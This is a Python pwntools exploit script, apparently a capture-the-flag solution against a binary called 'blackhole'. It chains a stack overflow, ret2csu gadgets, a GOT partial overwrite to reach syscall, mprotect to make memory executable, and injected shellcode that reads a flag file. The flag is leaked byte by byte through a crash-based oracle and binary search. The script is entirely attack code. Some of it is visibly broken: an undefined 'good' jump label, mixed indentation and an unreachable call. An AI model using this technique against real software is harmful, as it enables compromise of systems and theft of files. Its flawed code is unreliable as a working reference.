from pwn import *

context(arch="amd64", os="linux")

register_gadget = 0x400a4a
rip_gadget = 0x400a30

bss = 0x601068
bof = 0x4009a7
rwx = 0x601000

def exploit(offset, value):
	binary='./blackhole'
	s=process('./blackhole')
	e=ELF(binary)
	
	asmcode = """
xor rax, rax
xor rdi, rdi
mov rsi, 0x601300
mov rdx, 5
syscall

mov rax, 2
mov rdi, 0x601300
mov rsi, 0
mov rdx, 0
syscall

xchg rax, rdi
xor rax, rax
mov rsi, 0x601100
mov rdx, 0x3c
syscall

mov rcx, 0x601100
add rcx, %d
mov al, byte ptr[rcx]
cmp al, %d
jge good

false:
mov rax, 60
syscall

true:
xor rax, rax
xor rdi, rdi
mov rsi, 0x601500
mov rdx, 0x100
syscall
jmp true
""" % (offset, value)

	shellcode = p64(e.got['alarm']+0x10) # shellcode addr
	shellcode += asm(asmcode)

	def csu(rbx, rbp, r12, r13, r14, r15, ret):
		payloads = ''
		payloads += p64(register_gadget) # args setting
		payloads += p64(rbx) # pop rbx
		payloads += p64(rbp) # pop rbp
		payloads += p64(r12) # pop r12 => function()
		payloads += p64(r13) # pop r13 => arg3
		payloads += p64(r14) # pop r14 => arg2
		payloads += p64(r15) # pop r15 => arg1
		payloads += p64(ret) # rip
		return payloads

	payload = "A"*0x20 # buf
	payload += "B"*0x8 # sfp
	payload += csu(0x0, 0x1, e.got['read'], 0xa, e.got['alarm']-0x9, 0x0, rip_gadget) # rax => 0xa (syscall mprotect)
	payload += csu(0x0, 0x1, e.got['alarm'], 0x7, 0x1000, rwx, rip_gadget) # mprotect(rwx) -> 0x601000 ~ 0x602000 / rax => 0x0 (syscall read)
	payload += csu(0x0, 0x0, e.got['alarm'], len(shellcode), e.got['alarm']+0x8, 0x0, rip_gadget) # read -> shellcode [r12 + 1*8]
	payload += p64(0xdeadbeef)*3
	s.send(payload)
	sleep(0.01)
	s.send("A"*9+"\x8e") # alarm@got -> syscall 
	sleep(0.01)
	s.send(shellcode) # write shellcode
	sleep(0.01)
	s.send("flag\x00")
	try:
		s.recv(1, timeout = 0.03)
		s.close()
		return True
	except:
		s.close()
		return False
	s.interactive()

def brute_force():
        flag = ""

        while(1):
                left = 0
                right = 128

                for i in range(0, 8):
                        char = (left + right) / 2
                        result = exploit(len(flag), char)

                        if result:
                                left = char
                        else:
                                right = char
                if char == 0:
                        break
                flag +=  chr(char)
		
		if len(flag)==60:
			print flag

brute_force()
